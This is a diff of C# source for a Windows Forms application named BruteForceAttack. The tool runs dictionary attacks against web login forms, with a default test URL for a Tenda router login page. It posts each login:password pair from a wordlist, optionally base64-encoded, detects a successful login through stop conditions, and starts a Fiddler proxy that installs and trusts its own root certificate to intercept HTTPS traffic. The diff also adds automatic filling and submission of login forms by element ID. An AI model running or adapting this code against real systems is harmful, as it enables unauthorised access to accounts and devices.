@@ -3,40 +3,55 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
+using System.Runtime.Remoting.Channels;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Fiddler;
+using HtmlAgilityPack;
 
 namespace BruteForceAttack
 {
     public partial class Form1 : Form
     {
         private Credentials credentials = new Credentials();
+
         delegate void updatePostLog();
 
         public Form1()
         {
             InitializeComponent();
+            textBoxPostUrl.Text = "http://tendawifi.com/login/Auth"; // for testing purposes 
             webBrowser.Navigate(textBoxUrl.Text);
             richTextBoxDocumentText.Text = webBrowser.DocumentText;
+
+            //Highlighter.highlightHTMLText(richTextBoxDocumentText);
+
             comboBoxEncode.SelectedIndex = 0;
             comboBoxEncodeTypeDictionary.SelectedIndex = 0;
             comboBoxStopConditions.SelectedIndex = 0;
-            textBoxPostUrl.Text = "http://tendawifi.com/login/Auth"; // for testing purposes 
+
+            updateIDs("//input", listBoxInputID);
+            updateIDs("//button", listBoxButtonID);
+
+            toolTip.SetToolTip(listBoxInputID, "Click on an item to copy it to the clipboard.");
+            toolTip.SetToolTip(listBoxButtonID, "Click on an item to copy it to the clipboard.");
+
+
         }
 
         private void updatePostURL()
         {
-            string login = (checkBoxLogin.Checked) ?
-                encodeString(textBoxLogin.Text, comboBoxEncode.SelectedIndex) :
-                textBoxLogin.Text;
+            string login = (checkBoxLogin.Checked)
+                ? encodeString(textBoxLogin.Text, comboBoxEncode.SelectedIndex)
+                : textBoxLogin.Text;
 
-            string password = (checkBoxPassword.Checked) ?
-                encodeString(textBoxPassword.Text, comboBoxEncode.SelectedIndex) :
-                textBoxPassword.Text;
+            string password = (checkBoxPassword.Checked)
+                ? encodeString(textBoxPassword.Text, comboBoxEncode.SelectedIndex)
+                : textBoxPassword.Text;
 
 
             if (!String.IsNullOrEmpty(textBoxLogin.Text) && !String.IsNullOrEmpty(textBoxPassword.Text))
@@ -57,7 +72,7 @@ namespace BruteForceAttack
             {
                 case 1:
                     return EncodeUtilities.base64Encode(plaintext);
-                    
+
                 default: return plaintext;
             }
         }
@@ -77,6 +92,7 @@ namespace BruteForceAttack
             {
                 address = "http://" + address;
             }
+
             try
             {
                 webBrowser.Navigate(new Uri(address));
@@ -110,11 +126,14 @@ namespace BruteForceAttack
             {
                 textBoxUrl.Text = e.Url.ToString();
                 richTextBoxDocumentText.Text = webBrowser.DocumentText;
+                //  Highlighter.highlightHTMLText(richTextBoxDocumentText);
+                updateIDs("//input", listBoxInputID);
+                updateIDs("//button", listBoxButtonID);
             }
         }
 
         private void buttonPrevious_Click(object sender, EventArgs e)
-        { 
+        {
             if (webBrowser.CanGoBack)
                 webBrowser.GoBack();
         }
@@ -196,19 +215,19 @@ namespace BruteForceAttack
             int timeElapsed = 0;
             webBrowser.DocumentCompleted += (s, e) =>
             {
-                if (webBrowser.ReadyState != WebBrowserReadyState.Complete) 
+                if (webBrowser.ReadyState != WebBrowserReadyState.Complete)
                     return;
-                if (pageLoaded.Task.IsCompleted) 
-                    return; 
-                
+                if (pageLoaded.Task.IsCompleted)
+                    return;
+
                 pageLoaded.SetResult(true);
             };
-         
+
             while (pageLoaded.Task.Status != TaskStatus.RanToCompletion)
             {
                 await Task.Delay(delay);
                 timeElapsed++;
-                if (timeElapsed >= timeOut * 100) 
+                if (timeElapsed >= timeOut * 100)
                     pageLoaded.TrySetResult(true);
             }
         }
@@ -222,31 +241,33 @@ namespace BruteForceAttack
             bool isSuccess = false;
 
             LinkedList<Credential> encodedCredentials = encodeCredentials();
-            
+
             //encoding credentials
             if (!encodedCredentials.Equals(credentials.ListOfCredentials))
             {
-                richTextBoxLog.AppendText("\n" + getTime() + " Dictionary after encoding [login:password]" + Environment.NewLine);
+                richTextBoxLog.AppendText("\n" + getTime() + " Dictionary after encoding [login:password]" +
+                                          Environment.NewLine);
                 richTextBoxLog.AppendText(listToString(encodedCredentials) + Environment.NewLine);
             }
 
-                richTextBoxLog.AppendText(getTime() + " -! Performing post attack !-\r\n");
+            richTextBoxLog.AppendText(getTime() + " -! Performing post attack !-\r\n");
 
-            for (int i=0; i< encodedCredentials.Count; i++)
+            for (int i = 0; i < encodedCredentials.Count; i++)
             {
                 string postData = textBoxPostStringSyntax.Text.Replace("$0", encodedCredentials.ElementAt(i).Login)
-                                                              .Replace("$1", encodedCredentials.ElementAt(i).Password);
-                
+                    .Replace("$1", encodedCredentials.ElementAt(i).Password);
+
                 byte[] postDataByte = Encoding.UTF8.GetBytes(postData);
 
                 webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders);
                 string postLog = "credential [" + credentials.ListOfCredentials.ElementAt(i).Login +
-                                                ':' + credentials.ListOfCredentials.ElementAt(i).Password + "]\r\npost string= \"" + postData + "\"";
+                                 ':' + credentials.ListOfCredentials.ElementAt(i).Password + "]\r\npost string= \"" +
+                                 postData + "\"";
 
                 richTextBoxLog.AppendText(getTime() + " For " + postLog + Environment.NewLine);
 
                 try
-                {            
+                {
                     await PageLoad(1000, int.Parse(textBoxPostDelay.Text));
                 }
                 catch (Exception exception)
@@ -256,7 +277,7 @@ namespace BruteForceAttack
 
                 //execute stop conditions - dictionary attack success
                 if (isStopCondition(comboBoxStopConditions.SelectedIndex, documentTextStartPage,
-                                   textBoxRequestedUrl.Text, startUrl, webBrowser))
+                    textBoxRequestedUrl.Text, startUrl, webBrowser))
                 {
                     isSuccess = true;
                     string successLog = "Login success for " + postLog;
@@ -275,8 +296,8 @@ namespace BruteForceAttack
             }
 
             //save log to file
-            DialogResult dialogResult = MessageBox.Show("Do you want to save the log to a file?", 
-                                            "Save log to file", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+            DialogResult dialogResult = MessageBox.Show("Do you want to save the log to a file?",
+                "Save log to file", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
             if (dialogResult == DialogResult.Yes)
             {
                 saveFileDialog.InitialDirectory = "c:\\";
@@ -288,13 +309,14 @@ namespace BruteForceAttack
                 {
                     string filePath = saveFileDialog.FileName;
                     richTextBoxLog.SaveFile(filePath, RichTextBoxStreamType.UnicodePlainText);
-                    
-                    richTextBoxLog.AppendText(Environment.NewLine + " -! Log file saved to file: " + filePath + " !-\r\n");
+
+                    richTextBoxLog.AppendText(Environment.NewLine + " -! Log file saved to file: " + filePath +
+                                              " !-\r\n");
                 }
             }
         }
 
-        
+
 
         private LinkedList<Credential> encodeCredentials()
         {
@@ -304,40 +326,47 @@ namespace BruteForceAttack
                 if (!checkBoxLoginEncodeDictionary.Checked && !checkBoxPasswordEncodeDictionary.Checked) // none
                     return credentials.ListOfCredentials;
 
-                else if (!checkBoxLoginEncodeDictionary.Checked && checkBoxPasswordEncodeDictionary.Checked) // only password
+                else if (!checkBoxLoginEncodeDictionary.Checked && checkBoxPasswordEncodeDictionary.Checked
+                ) // only password
                     encodedList.AddLast(new Credential(
-                                    item.Login,
-                                    encodeString(item.Password, comboBoxEncodeTypeDictionary.SelectedIndex)));
+                        item.Login,
+                        encodeString(item.Password, comboBoxEncodeTypeDictionary.SelectedIndex)));
 
-                else if (checkBoxLoginEncodeDictionary.Checked && !checkBoxPasswordEncodeDictionary.Checked) // only login
+                else if (checkBoxLoginEncodeDictionary.Checked && !checkBoxPasswordEncodeDictionary.Checked
+                ) // only login
                     encodedList.AddLast(new Credential(
-                                    encodeString(item.Login, comboBoxEncodeTypeDictionary.SelectedIndex),
-                                    item.Password));
+                        encodeString(item.Login, comboBoxEncodeTypeDictionary.SelectedIndex),
+                        item.Password));
                 else // both
                     encodedList.AddLast(new Credential(
-                                        encodeString(item.Login, comboBoxEncodeTypeDictionary.SelectedIndex),
-                                        encodeString(item.Password, comboBoxEncodeTypeDictionary.SelectedIndex)));
+                        encodeString(item.Login, comboBoxEncodeTypeDictionary.SelectedIndex),
+                        encodeString(item.Password, comboBoxEncodeTypeDictionary.SelectedIndex)));
             }
+
             return encodedList;
         }
 
         private string listToString(LinkedList<Credential> list)
         {
-            StringBuilder builder = new StringBuilder(); 
+            StringBuilder builder = new StringBuilder();
             foreach (var item in list)
             {
                 builder.AppendLine('\t' + item.Login + ':' + item.Password);
             }
+
             return builder.ToString();
         }
 
-        private bool isStopCondition (int index, string documentTextStartPage, string destinationURL, string startUrl, WebBrowser webBrowser)
+        private bool isStopCondition(int index, string documentTextStartPage, string destinationURL, string startUrl,
+            WebBrowser webBrowser)
         {
             bool isStop = false;
             switch (index)
             {
                 case 0:
-                    isStop = webBrowser.DocumentText.Equals(documentTextStartPage) ? false : true; // param documentText of startingPage
+                    isStop = webBrowser.DocumentText.Equals(documentTextStartPage)
+                        ? false
+                        : true; // param documentText of startingPage
                     break;
                 case 1:
                     isStop = webBrowser.Url.ToString().Equals(destinationURL) ? true : false; // param = destinationURL 
@@ -346,18 +375,21 @@ namespace BruteForceAttack
                     isStop = webBrowser.Url.ToString().Equals(startUrl) ? false : true; // param = startUrl
                     break;
             }
+
             return isStop;
         }
 
-        private void richTextBoxLog_TextChanged(object sender, EventArgs e)
+        private void richTextBox_TextChanged(object sender, EventArgs e)
         {
-            richTextBoxLog.SelectionStart = richTextBoxLog.Text.Length;
-            richTextBoxLog.ScrollToCaret();
+            RichTextBox textBox = sender as RichTextBox;
+            textBox.SelectionStart = textBox.Text.Length;
+            textBox.ScrollToCaret();
         }
 
         private void startFiddler()
         {
-            FiddlerApplication.AfterSessionComplete += FiddlerApplication_AfterSessionComplete; ;
+            FiddlerApplication.AfterSessionComplete += FiddlerApplication_AfterSessionComplete;
+            ;
             FiddlerApplication.Startup(8888, true, true, true);
             InstallCertificate();
         }
@@ -372,9 +404,12 @@ namespace BruteForceAttack
                 if (!CertMaker.trustRootCert())
                     return false;
 
-                FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.key", FiddlerApplication.Prefs.GetStringPref("fiddler.certmaker.bc.key", null));
-                FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.cert", FiddlerApplication.Prefs.GetStringPref("fiddler.certmaker.bc.cert", null));
+                FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.key",
+                    FiddlerApplication.Prefs.GetStringPref("fiddler.certmaker.bc.key", null));
+                FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.cert",
+                    FiddlerApplication.Prefs.GetStringPref("fiddler.certmaker.bc.cert", null));
             }
+
             return true;
         }
 
@@ -387,7 +422,8 @@ namespace BruteForceAttack
                 string headers = session.oRequest.headers.ToString();
                 var reqBody = session.GetRequestBodyAsString();
 
-                string firstLine = session.RequestMethod + " " + session.fullUrl + " " + session.oRequest.headers.HTTPVersion;
+                string firstLine = session.RequestMethod + " " + session.fullUrl + " " +
+                                   session.oRequest.headers.HTTPVersion;
                 int at = headers.IndexOf("\r\n");
                 if (at < 0)
                     return;
@@ -399,10 +435,7 @@ namespace BruteForceAttack
                          separator + "\r\n\r\n";
             }
 
-            richTextBoxPOST.Invoke(new updatePostLog(() =>
-            {
-                richTextBoxPOST.AppendText(output);
-            }));
+            richTextBoxPOST.Invoke(new updatePostLog(() => { richTextBoxPOST.AppendText(output); }));
         }
 
         private void stopFiddler()
@@ -419,6 +452,106 @@ namespace BruteForceAttack
         private void Form1_Load(object sender, EventArgs e)
         {
             startFiddler();
+        }
+
+        private void updateIDs(string xpath, ListBox listBox)
+        {
+            listBox.Items.Clear();
+            HtmlAgilityPack.HtmlDocument document = new HtmlAgilityPack.HtmlDocument();
+            document.Load(new StringReader(webBrowser.DocumentText));
+            HtmlNodeCollection inputIDs = document.DocumentNode.SelectNodes(xpath);
+            foreach (var item in inputIDs)
+            {
+                if (!String.IsNullOrEmpty(item.GetAttributeValue("id", "")))
+                    listBox.Items.Add(item.GetAttributeValue("id", ""));
+
+            }
+        }
+
+        private void listBoxID_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            ListBox listBox = sender as ListBox;
+            try
+            {
+                Clipboard.SetText(listBox.GetItemText(listBox.SelectedItem));
+            }
+            catch (Exception exception)
+            {
+                Console.WriteLine(exception.ToString());
+            }
+            
+        }
+
+        private void buttonSingleIDAttack_Click(object sender, EventArgs e)
+        {
+            HtmlElement password = null;
+            HtmlElement login = null;
+            HtmlElement submit = null;
+
+            // login with username (program can perform login in without username also [special cases]) 
+            if (!String.IsNullOrEmpty(textBoxLoginID.Text))
+            {
+                try
+                {
+                    login = webBrowser.Document.GetElementById(textBoxLoginID.Text);
+                    login.SetAttribute("value", textBoxLogin_SIdA.Text);
+                }
+                catch (Exception exception)
+                {
+                    MessageBox.Show("Wrong Login ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    Console.WriteLine(exception.ToString());
+                }
+            }
+
+            // perform password section
+            try
+            {
+                password = webBrowser.Document.GetElementById(textBoxPasswordID.Text);
+                password.SetAttribute("value", textBoxPassword_SIdA.Text);
+            }
+            catch (Exception exception)
+            {
+                MessageBox.Show("Wrong Password ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                Console.WriteLine(exception.ToString());
+            }
+
+            // perform button section and click button
+            try
+            {
+                submit = webBrowser.Document.GetElementById(textBoxButtonID.Text);
+                submit.InvokeMember("click");
+                
+                //log
+                richTextBoxLog.AppendText(getTime() + " -! Performing Logging in using ID !-\r\n");
+                richTextBoxLog.AppendText("\tLogin id = " + textBoxLoginID.Text + Environment.NewLine);
+                richTextBoxLog.AppendText("\tLogin = " + textBoxLogin_SIdA.Text + Environment.NewLine);
+                richTextBoxLog.AppendText("\tPassword id = " + textBoxPasswordID.Text + Environment.NewLine);
+                richTextBoxLog.AppendText("\tPassword = " + textBoxPassword_SIdA.Text + Environment.NewLine);
+                richTextBoxLog.AppendText("\tButton id = " + textBoxButtonID.Text + new string('\n',2));
+            }
+            catch (Exception exception)
+            {
+                MessageBox.Show("Wrong Button ID.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                Console.WriteLine(exception.ToString());
+            }
+
+            
+
+            //      Logical stucture
+            // login = webBrowser.Document.GetElementById(textBoxLoginID.Text);
+            // password = webBrowser.Document.GetElementById(textBoxPasswordID.Text);
+            // submit = webBrowser.Document.GetElementById(textBoxButtonID.Text);
+            // login.SetAttribute("value", textBoxLogin_SIdA.Text);
+            // password.SetAttribute("value", textBoxPassword_SIdA.Text);
+            // submit.InvokeMember("click");
+        }
+
+        private void textBoxButtonID_TextChanged(object sender, EventArgs e)
+        {
+            if (!String.IsNullOrEmpty(textBoxButtonID.Text))
+                buttonSingleIDAttack.Enabled = true;
+            else
+                buttonSingleIDAttack.Enabled = false;
         }
     }
 }
